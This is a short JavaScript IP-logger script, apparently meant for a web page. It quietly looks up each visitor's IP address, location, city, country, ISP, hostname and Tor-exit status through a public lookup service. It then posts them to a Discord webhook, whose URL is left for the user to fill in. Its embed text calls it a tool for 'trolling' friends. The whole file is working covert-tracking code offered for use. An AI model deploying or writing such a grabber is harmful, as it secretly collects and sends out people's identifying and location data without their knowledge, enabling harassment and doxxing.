// Note: The process could be EASILY found in the console.
fetch("https://wtfismyip.com/json")
	.then((response) => response.json())
	.then((data) => {

		let Logger = {
			IP: data.YourFuckingIPAddress,
			Location: data.YourFuckingLocation,
			Hostname: data.YourFuckingHostname,
			ISP: data.YourFuckingISP,
			City: data.YourFuckingCity,
			country: data.YourFuckingCountry,
			Torexit: data.YourFuckingTorExit,
		}; // You can add more but I thought this was enough tbh 

		// Set up the response for the webhook
		const response = {
			embeds: [{
				color: 39423,
				title: 'Fulcrum',
				url: 'https://open.spotify.com/track/0qiWnrmi9yBjfqyPbYXPMi?si=765ac6d20e99425e',
				author: {
					name: 'SOULS',
					icon_url: 'https://cdn.discordapp.com/attachments/1244786792662569092/1244787199644401664/apple-touch-icon.png?ex=665661eb&is=6655106b&hm=7f8725c3753aca1e3b4307b84835cc13e9f69944e63527d2cd3a85b9506dc3bb&',
					url: 'https://soulsie.space',
				},
				description: '**This is only used for security/trolling purposes and not used against the people who are affected by this logger, \n\n there has been no records to using this logger against randoms only used with friends / inner circle.**',
				thumbnail: {
					url: 'https://soulsie.space'
				},
				fields: [{
					name: 'IP',
					value: '**' + Logger.IP + '**',
					inline: true,
				},
				{
					name: 'Tor Exit',
					value: '**' + Logger.TorExit + '**',
					inline: true,
				},
				{
					name: 'Location',
					value: '**' + Logger.Location + '**',
					inline: true,
				},
				{
					name: 'City',
					value: '**' + Logger.City + '**',
					inline: true,
				},
				{
					name: 'Country',
					value: '**' + Logger.Country + '**',
					inline: true,
				},
				{
					name: 'Network',
					value: '**' + Logger.Hostname + '**' + ' (' + Logger.ISP + ')',
					inline: false,
				}, ],
				image: {
					url: 'https://cdn.discordapp.com/attachments/1244786792662569092/1244795033442586644/fulcrum-come-in.gif?ex=66566937&is=665517b7&hm=6e257c04bf17090d2ea2718795a6e8c2549d9245616adc445359d106d68a49e2&',
				},
				timestamp: new Date().toISOString(),
				footer: {
					text: 'Occured at',
					icon_url: 'https://cdn.discordapp.com/attachments/1244786792662569092/1244787199644401664/apple-touch-icon.png?ex=665661eb&is=6655106b&hm=7f8725c3753aca1e3b4307b84835cc13e9f69944e63527d2cd3a85b9506dc3bb&',
				},
			}, ],
		}

		// response
		fetch("", { // webhook goes here
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify(response), // formatting the response in json
			})
			// error handling (risky but needed)
			.then((response) => console.log(response))
			.catch((error) => console.error(error));
	})
	.catch((error) => console.error(error));
